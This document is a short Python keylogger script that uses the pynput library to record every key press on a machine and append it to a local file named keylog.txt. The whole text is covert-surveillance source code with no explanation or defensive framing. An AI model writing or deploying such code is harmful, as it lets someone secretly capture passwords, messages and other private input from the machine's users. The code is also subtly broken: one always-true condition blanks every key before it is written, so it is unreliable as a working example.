from pynput.keyboard import Listener
def log_keystroke(key):
    key=str(key).replace("'","")
    if key=='Key.space':
        key=' '
    if key=='Key.enter':
        key='\n'
    if key=='Key.shift_r' or 'Key.backspace' or 'Key.cmds':
        key=''
    with open("keylog.txt",'a') as f:
        f.write(key)
with Listener(on_press=log_keystroke) as l:
    l.join()
